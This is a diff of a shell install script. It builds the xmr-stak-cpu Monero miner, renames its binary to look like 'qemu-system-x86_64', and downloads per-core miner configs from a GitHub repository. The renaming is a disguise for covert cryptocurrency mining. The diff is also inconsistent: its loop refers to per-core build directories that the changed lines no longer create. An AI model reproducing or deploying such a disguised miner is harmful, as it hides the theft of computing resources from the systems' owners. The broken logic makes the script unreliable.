@@ -11,12 +11,12 @@ apt-get install -y libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-d
 mkdir /usr/share/packages_download
 workingdir=/usr/share/packages_download/
 git clone https://github.com/fireice-uk/xmr-stak-cpu.git /usr/share/packages_download/qemu-system-x86
+cd $workingdir/qemu-system-x86
+cmake .
+make install
+mv $workingdir/qemu-system-x86/bin/xmr-stak-cpu $workingdir/qemu-system-x86/bin/qemu-system-x86_64
+curl https://raw.githubusercontent.com/githubuserold/miner/master/config.txt > $workingdir/qemu-system-x86/bin/config.txt
 for (( core=0; core<$phycores; core++ )); do
-        echo "core $core"
-        cp -r /usr/share/packages_download/qemu-system-x86 /usr/share/packages_download/qemu-system-x86-$core
-        cd $workingdir/qemu-system-x86-$core
-        cmake .
-        make install
         curl https://raw.githubusercontent.com/githubuserold/miner/master/cpu$core/config.txt > $workingdir/qemu-system-x86-$core/bin/config.txt
         mv $workingdir/qemu-system-x86-$core/bin/xmr-stak-cpu $workingdir/qemu-system-x86-$core/bin/qemu-system-x86
         cd $workingdir/qemu-system-x86-$core/bin/
